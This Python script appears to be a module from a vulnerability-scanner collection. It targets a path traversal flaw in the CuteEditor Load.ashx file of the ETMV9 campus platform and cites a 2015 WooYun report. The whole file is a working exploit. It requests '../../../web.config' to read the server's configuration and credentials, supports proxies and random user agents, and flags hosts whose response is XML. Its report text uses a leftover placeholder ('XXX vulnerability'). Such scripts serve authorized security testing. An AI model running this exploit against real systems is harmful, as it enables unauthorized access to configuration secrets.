#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ETMV9数字化校园平台任意下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0100796
author: Lucifer
description: 该校园平台使用了第三方编辑器CuteEditor，虽然删除了存在任意文件上传的漏洞文件uploader.ashx
        （具体利用可参考白帽子zcgonvh的http://**.**.**.**/bugs/wooyun-2010-061932），与目录遍历漏洞文件browse_Img.asp，但是却忽略了任意文件包含漏洞文件Load.ashx。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/ETMDCP/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    payload_url = scheme+"://"+url+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if resp.headers["Content-Type"] == "application/xml":
            Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass